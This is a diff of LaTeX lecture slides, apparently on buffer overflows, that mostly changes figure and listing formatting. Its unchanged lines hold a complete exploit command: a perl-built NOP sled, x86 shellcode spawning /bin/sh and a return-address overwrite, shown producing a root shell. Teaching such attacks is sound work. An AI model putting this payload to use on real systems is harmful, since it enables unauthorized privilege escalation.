@@ -25,17 +25,17 @@
 \framebreak
 	\begin{figure}
 		\centering
-		\includegraphics[width=\textwidth]{imgs/whoami.png}
+		\includegraphics[width=0.4\textwidth]{imgs/whoami.png}
 		\caption{BOF whoami: root}
 		\label{fig:whoami}
 	\end{figure}
 \framebreak
 	\begin{block}{Also known as}
-		\begin{verbatim}
+		\begin{lstlisting}
 			user$ ./note `perl -e 'printf("\x90" x 153 . "\x31\xdb\x31\xc9\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd\x80" . "\x90" x 22 . "\xef\xbe\xad\xde")'`
 			sh-3.1# whoami
 			root
-		\end{verbatim}
+		\end{lstlisting}
 	\end{block}
 \end{frame}
 
@@ -50,9 +50,11 @@
 			\end{lstlisting}
 		\end{column}
 		\begin{column}{.6\textwidth}
+			\begin{figure}
 			\includegraphics[width=\textwidth]{imgs/initialAB.png}
-			\caption{A and B variables initial state}
 			\label{fig:initialAB}
+			\caption{A and B variables initial state}			
+			\end{figure}
 		\end{column}
 	\end{columns}
 %	\begin{figure}
@@ -71,9 +73,11 @@
 			\end{lstlisting}
 		\end{column}
 		\begin{column}{.6\textwidth}
+			\begin{figure}
 			\includegraphics[width=\textwidth]{imgs/finalAB.png}
-			\caption{A and B variables final state}
 			\label{fig:finalAB}
+			\caption{A and B variables final state}
+			\end{figure}
 		\end{column}
 	\end{columns}
 %	\begin{figure}
